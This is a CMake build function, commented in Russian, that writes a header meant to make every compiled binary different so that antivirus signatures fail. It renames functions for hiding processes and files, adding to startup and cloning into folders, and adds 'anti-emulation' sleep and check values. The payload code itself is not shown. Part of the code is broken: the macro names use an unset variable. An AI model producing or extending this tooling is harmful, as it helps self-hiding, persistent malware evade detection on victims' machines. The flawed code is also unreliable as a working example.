# Генерация полиморфных сигнатур - разные бинарники при каждой компиляции
function(generate_polymorphic_header OUTPUT_FILE)
    # Генерируем уникальный хеш на основе текущего времени и случайных данных
    string(TIMESTAMP TIMESTAMP_VALUE "%s")
    string(RANDOM LENGTH 16 RANDOM_VALUE)
    
    # Объединяем для получения уникального значения
    string(CONCAT UNIQUE_SEED "${TIMESTAMP_VALUE}${RANDOM_VALUE}${CMAKE_RANDOM}")
    
    # Хешируем значение (используем встроенный CMake механизм)
    string(MD5 UNIQUE_HASH "${UNIQUE_SEED}")
    
    # Извлекаем числовые значения из хеша
    string(SUBSTRING "${UNIQUE_HASH}" 0 8 HASH_PART1)
    string(SUBSTRING "${UNIQUE_HASH}" 8 8 HASH_PART2)
    string(SUBSTRING "${UNIQUE_HASH}" 16 8 HASH_PART3)
    
    # Конвертируем в десятичные числа
    set(OFFSET1 0x${HASH_PART1})
    set(OFFSET2 0x${HASH_PART2})
    set(OFFSET3 0x${HASH_PART3})
    
    # Генерируем уникальные имена функций
    string(SUBSTRING "${UNIQUE_HASH}" 0 16 FUNC_HASH)
    set(POLY_FUNC_NAME "Func_${FUNC_HASH}")
    set(POLY_SECURITY_NAME "Sec_${FUNC_HASH}")
    set(POLY_SCREEN_NAME "Scr_${FUNC_HASH}")
    
    # Генерируем номер версии для обфускации (целое число из timestamp)
    math(EXPR POLY_VERSION_NUM "${TIMESTAMP_VALUE} % 9000 + 1000")
    
    # Создаём header файл
    file(WRITE "${OUTPUT_FILE}" "// АВТОМАТИЧЕСКИ СГЕНЕРИРОВАННЫЙ ФАЙЛ - НЕ РЕДАКТИРОВАТЬ\n")
    file(APPEND "${OUTPUT_FILE}" "// Генерация полиморфных сигнатур при каждой компиляции\n")
    file(APPEND "${OUTPUT_FILE}" "// Timestamp: ${TIMESTAMP_VALUE}\n")
    file(APPEND "${OUTPUT_FILE}" "// Random: ${RANDOM_VALUE}\n")
    file(APPEND "${OUTPUT_FILE}" "// Hash: ${UNIQUE_HASH}\n\n")
    
    file(APPEND "${OUTPUT_FILE}" "#ifndef POLYMORPHISM_H\n")
    file(APPEND "${OUTPUT_FILE}" "#define POLYMORPHISM_H\n\n")
    
    file(APPEND "${OUTPUT_FILE}" "// ПОЛИМОРФНЫЕ КОНСТАНТЫ\n")
    file(APPEND "${OUTPUT_FILE}" "#define POLY_OFFSET_1 ${OFFSET1}\n")
    file(APPEND "${OUTPUT_FILE}" "#define POLY_OFFSET_2 ${OFFSET2}\n")
    file(APPEND "${OUTPUT_FILE}" "#define POLY_OFFSET_3 ${OFFSET3}\n")
    file(APPEND "${OUTPUT_FILE}" "#define POLY_VERSION ${POLY_VERSION_NUM}\n\n")
    
    file(APPEND "${OUTPUT_FILE}" "// ОБФУСКОВАННЫЕ ИМЕНА ФУНКЦИЙ\n")
    file(APPEND "${OUTPUT_FILE}" "#define INIT_WINDOW_${POLY_VERSION} InitializeWindow\n")
    file(APPEND "${OUTPUT_FILE}" "#define HIDE_PROCESS_${POLY_VERSION} HideProcess\n")
    file(APPEND "${OUTPUT_FILE}" "#define HIDE_FILE_${POLY_VERSION} HideFile\n")
    file(APPEND "${OUTPUT_FILE}" "#define ADD_STARTUP_${POLY_VERSION} AddToStartup\n")
    file(APPEND "${OUTPUT_FILE}" "#define CLONE_FOLDERS_${POLY_VERSION} CloneToFolders\n")
    file(APPEND "${OUTPUT_FILE}" "#define LOAD_EXE_CACHE_${POLY_VERSION} LoadExeToCache\n")
    file(APPEND "${OUTPUT_FILE}" "#define FREE_EXE_CACHE_${POLY_VERSION} FreeExeCache\n\n")
    
    file(APPEND "${OUTPUT_FILE}" "// ДИНАМИЧЕСКИЕ СМЕЩЕНИЯ ДЛЯ АНТИЭМУЛЯЦИИ\n")
    file(APPEND "${OUTPUT_FILE}" "constexpr unsigned int POLY_CHECK_INTERVAL = POLY_OFFSET_1 & 0xFFFF;\n")
    file(APPEND "${OUTPUT_FILE}" "constexpr unsigned int POLY_SLEEP_TIME = POLY_OFFSET_2 & 0xFFFF;\n")
    file(APPEND "${OUTPUT_FILE}" "constexpr unsigned int POLY_RANDOM_SEED = POLY_OFFSET_3 & 0xFFFFFFFF;\n\n")
    
    file(APPEND "${OUTPUT_FILE}" "#endif // POLYMORPHISM_H\n")
    
    message(STATUS "[POLYMORPHISM] Сгенерирован полиморфный header")
    message(STATUS "  Hash: ${UNIQUE_HASH}")
    message(STATUS "  Version: ${POLY_VERSION_NUM}")
    message(STATUS "  Offsets: ${OFFSET1} ${OFFSET2} ${OFFSET3}")
endfunction()
